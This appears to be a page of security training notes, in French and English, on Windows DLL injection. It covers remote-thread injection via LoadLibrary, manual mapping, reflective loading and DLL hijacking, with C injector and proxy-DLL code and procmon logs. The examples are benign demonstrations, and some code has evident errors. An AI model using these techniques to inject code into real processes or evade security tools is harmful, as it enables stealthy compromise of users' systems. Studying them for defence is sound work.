# DLL Injection

**L’injection de DLL** est une méthode qui consiste à insérer un morceau de code, structuré sous forme de **bibliothèque de liens dynamiques (DLL)**, dans un processus en cours d’exécution. Cette technique permet au code injecté de s’exécuter dans le contexte du processus ciblé, influençant ainsi son comportement ou accédant à ses ressources.

L’injection de DLL a des **applications légitimes** dans divers domaines. Par exemple, les développeurs de logiciels utilisent cette technologie pour le **hot patching**, une méthode qui permet de modifier ou de mettre à jour du code sans avoir à redémarrer immédiatement le processus en cours. Un exemple notable est l’utilisation du hot patching par Azure pour mettre à jour des serveurs en fonctionnement, permettant ainsi de bénéficier des mises à jour sans interruption de service.

Cependant, cette technique n’est **pas sans danger**. Les cybercriminels en abusent souvent pour **insérer du code malveillant dans des processus de confiance**. Cette approche est particulièrement efficace pour **échapper à la détection des logiciels de sécurité**.

Il existe plusieurs méthodes différentes permettant de réaliser concrètement une injection de DLL.

***

### <mark style="color:red;">LoadLibrary</mark>

**LoadLibrary** est une méthode largement utilisée pour l’injection de DLL. Elle utilise l’API **LoadLibrary** pour charger la DLL dans l’espace mémoire du processus cible.

L’API **LoadLibrary** est une fonction fournie par le système d’exploitation Windows qui permet de **charger une bibliothèque dynamique (DLL)** dans la mémoire du processus en cours. Elle retourne un **handle** (un identifiant) qui peut ensuite être utilisé pour **obtenir les adresses des fonctions** contenues dans la DLL.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```

The first example shows how `LoadLibrary` can be used to load a DLL into the current process legitimately.

<pre class="language-c" data-full-width="true"><code class="lang-c"><strong>#include &#x3C;windows.h>
</strong>#include &#x3C;stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
</code></pre>

Le **deuxième exemple illustre l’utilisation de LoadLibrary pour l’injection de DLL**.\
Ce processus consiste à **allouer de la mémoire dans le processus cible** pour y stocker le chemin de la DLL, puis à **lancer un thread distant** (remote thread) qui commence par appeler **LoadLibrary**, en lui passant ce chemin de DLL. Cela permet de charger la DLL dans le processus cible.

***

### <mark style="color:red;">Manual Mapping</mark>

**Le&#x20;**_**Manual Mapping**_**&#x20;est une méthode d'injection de DLL incroyablement complexe et avancée.**\
Elle consiste à **charger manuellement une DLL dans la mémoire d'un processus** et à résoudre ses imports et ses relocations. Cependant, elle évite une détection facile en **ne pas utiliser la fonction LoadLibrary**, dont l’utilisation est surveillée par les systèmes de sécurité et de protection contre la triche.

Voici une **version simplifiée du processus** :

1. **Charger la DLL sous forme de données brutes** dans le processus injecteur.
2. **Mapper les sections de la DLL** dans le processus cible.
3. **Injecter du shellcode** dans le processus cible et l'exécuter. Ce shellcode va :
   * Relocaliser la DLL,
   * Rectifier les imports,
   * Exécuter les callbacks **Thread Local Storage (TLS)**,
   * Et enfin appeler la fonction principale de la DLL.

***

### <mark style="color:red;">Reflective DLL Injection</mark>

`Reflective DLL injection` is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.

[Stephen Fewer has a great GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection) demonstrating the technique. Borrowing his explanation below:

"The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.

Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.

1. Execution control is transferred to the library's `ReflectiveLoader` function, an exported function found in the library's export table. This can happen either via `CreateRemoteThread()` or a minimal bootstrap shellcode.
2. As the library's image currently resides in an arbitrary memory location, the `ReflectiveLoader` initially calculates its own image's current memory location to parse its own headers for later use.
3. The `ReflectiveLoader` then parses the host process's `kernel32.dll` export table to calculate the addresses of three functions needed by the loader, namely `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.
4. The `ReflectiveLoader` now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
5. The library's headers and sections are loaded into their new memory locations.
6. The `ReflectiveLoader` then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
7. The `ReflectiveLoader` then processes the newly loaded copy of its image's relocation table.
8. The `ReflectiveLoader` then calls its newly loaded image's entry point function, `DllMain,` with `DLL_PROCESS_ATTACH`. The library has now been successfully loaded into memory.
9. Finally, the `ReflectiveLoader` returns execution to the initial bootstrap shellcode that called it, or if it were called via `CreateRemoteThread`, the thread would terminate."

***

### <mark style="color:red;">DLL Hijacking</mark>

**L'injection de DLL (DLL Hijacking)** est une technique d'exploitation où un attaquant exploite le processus de chargement des DLL sous Windows. Cela se produit lorsqu'une application charge une DLL pendant son exécution, et si l'application ne spécifie pas le chemin complet de la DLL requise, cela ouvre une porte pour une attaque.

#### <mark style="color:green;">Comment ça fonctionne ?</mark>

Le processus par défaut de recherche de DLL utilisé par le système dépend de l'activation du mode **Safe DLL Search Mode**. Lorsqu'il est activé (ce qui est le paramètre par défaut), ce mode repositionne le répertoire courant de l'utilisateur plus bas dans l'ordre de recherche. Il est facile de **modifier ou désactiver** ce paramètre via l'éditeur du registre.

**Pour activer ou désactiver le Safe DLL Search Mode, voici les étapes :**

1. Appuyez sur la touche **Windows** + **R** pour ouvrir la boîte de dialogue **Exécuter**.
2. Tapez **Regedit** et appuyez sur **Entrée**. Cela ouvrira l'éditeur du registre.
3. Allez dans :\
   **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager**.
4. Dans le panneau de droite, cherchez la valeur **SafeDllSearchMode**. Si elle n'existe pas, faites un clic droit dans l'espace vide ou faites un clic droit sur le dossier **Session Manager**, sélectionnez **Nouveau** puis **Valeur DWORD (32 bits)**. Nommez cette nouvelle valeur **SafeDllSearchMode**.
5. Double-cliquez sur **SafeDllSearchMode**. Dans le champ **Données de la valeur**, entrez **1** pour activer et **0** pour désactiver le **Safe DLL Search Mode**.
6. Cliquez sur **OK**, fermez l'éditeur du registre et redémarrez le système pour que les changements prennent effet.

**Avec ce mode activé, l’ordre de recherche des DLL est le suivant :**

1. Le répertoire depuis lequel l'application est chargée.
2. Le répertoire système.
3. Le répertoire du système 16 bits.
4. Le répertoire Windows.
5. Le répertoire courant.
6. Les répertoires listés dans la variable d'environnement **PATH**.

**Si Safe DLL Search Mode est désactivé, l'ordre de recherche change pour :**

1. Le répertoire depuis lequel l'application est chargée.
2. Le répertoire courant.
3. Le répertoire système.
4. Le répertoire du système 16 bits.
5. Le répertoire Windows.
6. Les répertoires listés dans la variable d'environnement **PATH**.

#### <mark style="color:green;">Étapes de l'attaque :</mark>

**DLL Hijacking** implique plusieurs étapes :

1. **Trouver la DLL cible** :\
   Il faut identifier quelle DLL l'application essaie de charger. Pour ce faire, des outils spécifiques peuvent faciliter cette tâche :
   * **Process Explorer** : Un outil de la suite Sysinternals de Microsoft qui fournit des informations détaillées sur les processus en cours, y compris les DLL chargées. En sélectionnant un processus et en inspectant ses propriétés, vous pouvez voir les DLLs associées.
   * **PE Explorer** : Un explorateur de fichiers exécutables (Portable Executable) qui permet d'ouvrir et d'examiner des fichiers PE (comme les .exe ou .dll). Il montre aussi les DLLs à partir desquelles le fichier importe des fonctionnalités.
2. **Modifier les fonctions de la DLL** :\
   Une fois que vous avez identifié la DLL, il faut déterminer quelles fonctions modifier. Pour cela, des outils de **reverse engineering** (comme des désassembleurs et des débogueurs) sont nécessaires. Une fois que les fonctions et leurs signatures sont identifiées, il est temps de **construire la DLL malveillante**.

{% code fullWidth="true" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```
{% endcode %}

It loads an `add` function from the `library.dll` and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe the process of loading the `library.dll` located in the same directory.

First, let's set up a filter in procmon to solely include `main.exe`, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of `main.exe`. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close `main.exe` and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>



Then if you scroll to the bottom, you can see the call to load `library.dll`.

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

We can further filter for an `Operation` of `Load Image` to only get the libraries the app is loading.

```shell-session
16:13:30,0074709	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\main.exe	SUCCESS	Image Base: 0xf60000, Image Size: 0x26000
16:13:30,0075369	main.exe	47792	Load Image	C:\Windows\System32\ntdll.dll	SUCCESS	Image Base: 0x7ffacdbf0000, Image Size: 0x214000
16:13:30,0075986	main.exe	47792	Load Image	C:\Windows\SysWOW64\ntdll.dll	SUCCESS	Image Base: 0x77a30000, Image Size: 0x1af000
16:13:30,0120867	main.exe	47792	Load Image	C:\Windows\System32\wow64.dll	SUCCESS	Image Base: 0x7ffacd5a0000, Image Size: 0x57000
16:13:30,0122132	main.exe	47792	Load Image	C:\Windows\System32\wow64base.dll	SUCCESS	Image Base: 0x7ffacd370000, Image Size: 0x9000
16:13:30,0123231	main.exe	47792	Load Image	C:\Windows\System32\wow64win.dll	SUCCESS	Image Base: 0x7ffacc750000, Image Size: 0x8b000
16:13:30,0124204	main.exe	47792	Load Image	C:\Windows\System32\wow64con.dll	SUCCESS	Image Base: 0x7ffacc850000, Image Size: 0x16000
16:13:30,0133468	main.exe	47792	Load Image	C:\Windows\System32\wow64cpu.dll	SUCCESS	Image Base: 0x77a20000, Image Size: 0xa000
16:13:30,0144586	main.exe	47792	Load Image	C:\Windows\SysWOW64\kernel32.dll	SUCCESS	Image Base: 0x76460000, Image Size: 0xf0000
16:13:30,0146299	main.exe	47792	Load Image	C:\Windows\SysWOW64\KernelBase.dll	SUCCESS	Image Base: 0x75dd0000, Image Size: 0x272000
16:13:31,7974779	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\library.dll	SUCCESS	Image Base: 0x6a1a0000, Image Size: 0x1d000
```

#### <mark style="color:green;">Proxying</mark>

We can utilize a method known as DLL Proxying to execute a Hijack. We will create a new library that will load the function `Add` from `library.dll`, tamper with it, and then return it to `main.exe`.

1. Create a new library: We will create a new library serving as the proxy for `library.dll`. This library will contain the necessary code to load the `Add` function from `library.dll` and perform the required tampering.
2. Load the `Add` function: Within the new library, we will load the `Add` function from the original `library.dll`. This will allow us to access the original function.
3. Tamper with the function: Once the `Add` function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add `+ 1` to the result.
4. Return the modified function: After completing the tampering process, we will return the modified `Add` function from the new library back to `main.exe`. This will ensure that when `main.exe` calls the `Add` function, it will execute the modified version with the intended changes.

{% code fullWidth="true" %}
```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```
{% endcode %}

Either compile it or use the precompiled version provided. Rename `library.dll` to `library.o.dll`, and rename `tamper.dll` to `library.dll`.

Running `main.exe` then shows the successful hack.

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:green;">Invalid Libraries</mark>

Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in `.dll` and has a status of `NAME NOT FOUND` we can find such libraries in `main.exe`.

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

As we know, `main.exe` searches in many locations looking for `x.dll`, but it doesn’t find it anywhere. The entry we are particularly interested in is:

```shell-session
17:55:39,7848570	main.exe	37940	CreateFile	C:\Users\PandaSt0rm\Desktop\Hijack\x.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```

Where it is looking to load `x.dll` from the app directory. We can take advantage of this and load our own code, with very little context of what it is looking for in `x.dll`.

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

This code defines a DLL entry point function called `DllMain` that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print `Hijacked... Oops...` to the terminal, but you could theoretically do anything here.

Either compile it or use the precompiled version provided. Rename `hijack.dll` to `x.dll`, and run `main.exe`.

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
